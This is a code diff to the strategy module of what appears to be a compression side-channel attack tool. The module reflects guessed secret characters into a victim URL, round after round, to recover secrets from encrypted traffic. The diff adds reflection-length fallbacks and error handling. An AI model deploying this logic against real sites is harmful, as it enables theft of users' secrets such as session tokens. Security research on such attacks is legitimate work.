@@ -27,7 +27,12 @@ class Strategy(object):
         if not current_round_index:
             current_round_index = 1
             self._analyzed = True
-            self.begin_attack()
+            try:
+                self.begin_attack()
+            except ValueError:
+                # If the initial round or samplesets cannot be created, end the analysis
+                self._analyzed = True
+                return
 
         self._round = Round.objects.filter(victim=self._victim, index=current_round_index)[0]
         self._analyzed = False
@@ -49,7 +54,7 @@ class Strategy(object):
             Target.SERIAL: self._build_candidates_serial,
             Target.DIVIDE_CONQUER: self._build_candidates_divide_conquer
         }
-        return methods[self._victim.target.method](state)
+        return methods[self._round.get_method()](state)
 
     def _get_first_round_state(self):
         return {
@@ -64,7 +69,7 @@ class Strategy(object):
             started=None
         )
 
-    def _reflection(self, sampleset):
+    def _reflection(self, alphabet):
         # We use '^' as a separator symbol and we assume it is not part of the
         # secret. We also assume it will not be in the content.
 
@@ -79,7 +84,7 @@ class Strategy(object):
         knownalphabet_complement = list(set(string.ascii_letters + string.digits) - set(self._round.knownalphabet))
 
         candidate_secrets = set()
-        for letter in sampleset.candidatealphabet:
+        for letter in alphabet:
             candidate_secret = self._round.knownsecret + letter
             candidate_secrets.add(candidate_secret)
 
@@ -89,27 +94,31 @@ class Strategy(object):
         assert(len(knownalphabet_complement) > candidate_balance)
         candidate_balance = [self._round.knownsecret + c for c in knownalphabet_complement[0:candidate_balance]]
 
-        # Huffman complement indicates the knownalphabet symbols that are not currently being tested
-        huffman_complement = set(self._round.knownalphabet) - set(sampleset.candidatealphabet)
-
-        huffman_balance = added_symbols - len(candidate_balance)
-        assert(len(knownalphabet_complement) > len(candidate_balance) + huffman_balance)
-        huffman_balance = knownalphabet_complement[len(candidate_balance):huffman_balance]
-
         reflected_data = [
             '',
             sentinel.join(list(candidate_secrets) + candidate_balance),
-            sentinel.join(list(huffman_complement) + huffman_balance),
             ''
         ]
+
+        if self._round.check_huffman_pool():
+            # Huffman complement indicates the knownalphabet symbols that are not currently being tested
+            huffman_complement = set(self._round.knownalphabet) - set(alphabet)
+
+            huffman_balance = added_symbols - len(candidate_balance)
+            assert(len(knownalphabet_complement) > len(candidate_balance) + huffman_balance)
+            huffman_balance = knownalphabet_complement[len(candidate_balance):huffman_balance]
+            reflected_data.insert(1, sentinel.join(list(huffman_complement) + huffman_balance))
 
         reflection = sentinel.join(reflected_data)
 
         return reflection
 
+    def _url(self, alphabet):
+        return self._victim.target.endpoint % self._reflection(alphabet)
+
     def _sampleset_to_work(self, sampleset):
         return {
-            'url': self._victim.target.endpoint % self._reflection(sampleset),
+            'url': self._url(sampleset.candidatealphabet),
             'amount': SAMPLES_PER_SAMPLESET,
             'alignmentalphabet': sampleset.alignmentalphabet,
             'timeout': 0
@@ -119,6 +128,9 @@ class Strategy(object):
         '''Produces work for the victim.
 
         Pre-condition: There is already work to do.'''
+
+        if self._analyzed:
+            return {}
 
         try:
             self._sniffer.start()
@@ -218,27 +230,59 @@ class Strategy(object):
 
         self._create_round(self._decision['state'])
 
+    def _check_reflection_length(self, state):
+        if self._round.victim.target.maxreflectionlength == 0:
+            return
+
+        logger.debug('Checking max reflection length...')
+
+        while True:
+            alphabet = self._build_candidates(state)[0]
+            reflection = self._reflection(alphabet)
+            if len(reflection) > self._round.victim.target.maxreflectionlength:
+                if self._round.get_method() == Target.DIVIDE_CONQUER:
+                    self._round.method = Target.SERIAL
+                    logger.debug('Divide & conquer method cannot be used, falling back to serial.')
+                elif self._round.check_huffman_pool():
+                    self._round.huffman_pool = False
+                    logger.debug('Huffman pool cannot be used, removing it.')
+                elif self._round.check_block_align():
+                    self._round.block_align = False
+                    logger.debug('Block alignment cannot be used, removing it.')
+                else:
+                    raise ValueError('Cannot attack, specified maxreflectionlength is too short')
+            else:
+                return
+
     def _create_round(self, state):
         '''Creates a new round based on the analysis of the current round.'''
 
         assert(self._analyzed)
-
-        candidate_alphabets = self._build_candidates(state)
 
         # This next round could potentially be the final round.
         # A final round has the complete secret stored in knownsecret.
         next_round = Round(
             victim=self._victim,
             index=self._round.index + 1 if hasattr(self, '_round') else 1,
-            maxroundcardinality=max(map(len, candidate_alphabets)),
-            minroundcardinality=min(map(len, candidate_alphabets)),
             amount=SAMPLES_PER_SAMPLESET,
             knownalphabet=state['knownalphabet'],
             knownsecret=state['knownsecret']
         )
         next_round.save()
-
         self._round = next_round
+
+        try:
+            self._check_reflection_length(state)
+        except ValueError, err:
+            self._round.delete()
+            self._analyzed = True
+            logger.debug(err)
+            raise err
+
+        candidate_alphabets = self._build_candidates(state)
+
+        self._round.maxroundcardinality = max(map(len, candidate_alphabets))
+        self._round.minroundcardinality = min(map(len, candidate_alphabets))
 
         logger.debug('Created new round:')
         logger.debug('\tKnown secret: {}'.format(next_round.knownsecret))
@@ -253,9 +297,12 @@ class Strategy(object):
 
         candidate_alphabets = self._build_candidates(state)
 
-        alignmentalphabet = list(self._round.victim.target.alignmentalphabet)
-        random.shuffle(alignmentalphabet)
-        alignmentalphabet = ''.join(alignmentalphabet)
+        alignmentalphabet = ''
+        if self._round.check_block_align():
+            alignmentalphabet = list(self._round.victim.target.alignmentalphabet)
+            random.shuffle(alignmentalphabet)
+            alignmentalphabet = ''.join(alignmentalphabet)
+
         logger.debug('\tAlignment alphabet: {}'.format(alignmentalphabet))
 
         for candidate in candidate_alphabets:
@@ -341,7 +388,11 @@ class Strategy(object):
 
         if self._round_is_completed():
             # Advance to the next round.
-            self._create_next_round()
+            try:
+                self._create_next_round()
+            except ValueError:
+                # If a new round cannot be created, end the attack
+                return True
 
             if self._attack_is_completed():
                 return True
